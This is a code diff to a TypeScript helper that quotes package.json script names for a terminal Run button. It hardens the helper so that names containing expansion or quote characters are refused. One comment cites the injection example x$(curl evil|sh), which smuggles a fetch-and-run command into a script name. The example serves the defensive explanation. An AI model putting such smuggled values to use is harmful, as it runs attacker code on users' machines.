@@ -38,25 +38,40 @@ export interface PackageScripts {
  */
 const SAFE_NAME = /^[A-Za-z0-9_@:.\-\/]+$/
 
+/** Names that are still inert INSIDE double quotes: no expansion (POSIX
+ *  `$VAR` / `$(cmd)` / backticks, cmd.exe `%VAR%`), no escape character
+ *  (`\` POSIX, `` ` `` PowerShell), no history event (`!` expands before
+ *  quoting in an interactive bash line), and no quote that would close the
+ *  wrapper early (`"` — and `'`, which is opaque inside POSIX doubles but
+ *  opens an argument in cmd/PowerShell). A script name is attacker-chosen
+ *  data from a repository the user merely added, so anything else is
+ *  unquotable rather than half-quoted: `x$(curl evil|sh)` must never be
+ *  typed at a shell just because it was wrapped in "quotes". */
+const QUOTABLE_NAME = /^[^"'`$\\%!]+$/
+
 /**
  * Quote one script name for the shell that will receive the typed line.
  * Double quotes are the one spelling cmd, PowerShell and POSIX shells all
- * treat as a single argument. A name carrying its own double quote cannot be
- * quoted portably into any of them — npm itself can barely run those — so it
- * is wrapped as-is and documented as unsupported rather than half-escaped.
+ * treat as a single argument — but only for names nothing inside them can
+ * expand (see QUOTABLE_NAME). A name that cannot be quoted portably into
+ * any of the three answers null: the desk shows it without a Run button
+ * rather than typing a command line it cannot vouch for.
  */
-export function quoteScriptName(name: string): string {
+export function quoteScriptName(name: string): string | null {
   if (SAFE_NAME.test(name)) return name
-  return `"${name}"`
+  if (QUOTABLE_NAME.test(name)) return `"${name}"`
+  return null
 }
 
 /**
  * The exact line a Run press types into the terminal for one script, e.g.
- * `npm run dev`, `pnpm run build`, `npm run "build: win"`.
+ * `npm run dev`, `pnpm run build`, `npm run "build: win"`. Null for a name
+ * that cannot be quoted safely (see {@link quoteScriptName}).
  */
 export function scriptCommandLine(
   info: Pick<PackageScripts, 'manager'>,
   name: string
-): string {
-  return `${info.manager} run ${quoteScriptName(name)}`
+): string | null {
+  const quoted = quoteScriptName(name)
+  return quoted === null ? null : `${info.manager} run ${quoted}`
 }
